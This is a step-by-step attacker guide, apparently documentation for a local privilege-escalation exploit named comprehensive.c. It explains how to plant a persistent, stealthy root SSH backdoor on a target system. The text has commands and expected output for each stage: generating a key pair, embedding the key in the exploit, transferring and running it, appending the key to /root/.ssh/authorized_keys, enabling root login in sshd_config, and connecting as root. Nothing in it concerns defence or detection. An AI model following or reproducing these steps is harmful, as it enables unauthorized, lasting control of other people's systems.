# Option 1: Inject SSH Backdoor Key

## Overview

**Purpose:** Establishes persistent SSH access to the target system as root user, allowing you to remotely connect anytime without authentication.

**How It Works:**
1. Your SSH public key is added to `/root/.ssh/authorized_keys` on the target
2. You can then SSH directly as root using your corresponding private key
3. This persists across reboots and provides a stealthy backdoor

---

## Attacker's Perspective

### Prerequisites

Before using this option, you need:
- An SSH key pair (public + private keys)
- The target system's IP address
- Root SSH login enabled on target (or ability to enable it)

### Step 1: Generate SSH Key Pair (On Your Machine)

**Location:** Your local attacker machine

```bash
# Generate a new SSH key pair
ssh-keygen -t rsa -b 4096 -f ~/.ssh/backdoor_key -N ""

# Output:
# Generating public/private rsa key pair.
# Your identification has been saved in ~/.ssh/backdoor_key
# Your public key has been saved in ~/.ssh/backdoor_key.pub
```

**What this creates:**
- `~/.ssh/backdoor_key` → Private key (KEEP THIS SECRET - never share!)
- `~/.ssh/backdoor_key.pub` → Public key (this gets injected to target)

**Set correct permissions:**
```bash
chmod 600 ~/.ssh/backdoor_key
chmod 644 ~/.ssh/backdoor_key.pub
```

### Step 2: Extract Your Public Key

**Location:** Your local attacker machine

```bash
# View your public key
cat ~/.ssh/backdoor_key.pub
```

**Output example:**
```
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxYz123... user@hostname
```

**Copy the entire line** - you'll need it in the next step.

### Step 3: Update the Exploit Code

**Location:** Your local attacker machine

1. Open `comprehensive.c` in a text editor
2. Find line 62 (approximately) which contains:
   ```c
   static const char *SSH_PUBKEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQAB...";
   ```
3. Replace the value with your actual public key:
   ```c
   static const char *SSH_PUBKEY = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCxYz123... user@hostname";
   ```
4. Save the file

### Step 4: Recompile the Exploit

**Location:** Your local attacker machine

```bash
gcc -o comprehensive comprehensive.c -Wall -Wextra
```

### Step 5: Transfer Exploit to Target

**Location:** Your local attacker machine → Target machine

```bash
# Method 1: If you have SSH access
scp comprehensive user@target:/tmp/

# Method 2: If you have other transfer methods
# Use your preferred method (HTTP server, USB, etc.)
```

### Step 6: Run Exploit and Inject Key

**Location:** Target machine

```bash
# Run the exploit
./comprehensive

# Wait for privilege escalation...
# When menu appears, select option 1
Select option: 1
```

**Expected output:**
```
[INFO] Injecting SSH backdoor key
[INFO] SSH key injected successfully to /root/.ssh/authorized_keys
```

### Step 7: Verify Key Injection (Optional)

**Location:** Target machine

```bash
# Verify the key was added
sudo cat /root/.ssh/authorized_keys

# You should see your public key listed
```

### Step 8: Enable Root SSH Login (If Needed)

**Location:** Target machine

**Check if root SSH is enabled:**
```bash
sudo grep PermitRootLogin /etc/ssh/sshd_config
```

**If it shows `PermitRootLogin no`, enable it:**
```bash
# Backup original config
sudo cp /etc/ssh/sshd_config /etc/ssh/sshd_config.backup

# Enable root login
sudo sed -i 's/#PermitRootLogin prohibit-password/PermitRootLogin yes/' /etc/ssh/sshd_config
sudo sed -i 's/PermitRootLogin no/PermitRootLogin yes/' /etc/ssh/sshd_config

# Restart SSH service
sudo systemctl restart sshd

# Verify
sudo grep PermitRootLogin /etc/ssh/sshd_config
```

### Step 9: Connect via SSH

**Location:** Your local attacker machine

```bash
# Basic connection
ssh -i ~/.ssh/backdoor_key root@TARGET_IP

# If SSH is on non-standard port
ssh -i ~/.ssh/backdoor_key -p PORT root@TARGET_IP

# With verbose output (for debugging)
ssh -i ~/.ssh/backdoor_key -v root@TARGET_IP
```

**Success indicator:**
```
root@target:~# whoami
root
```

---
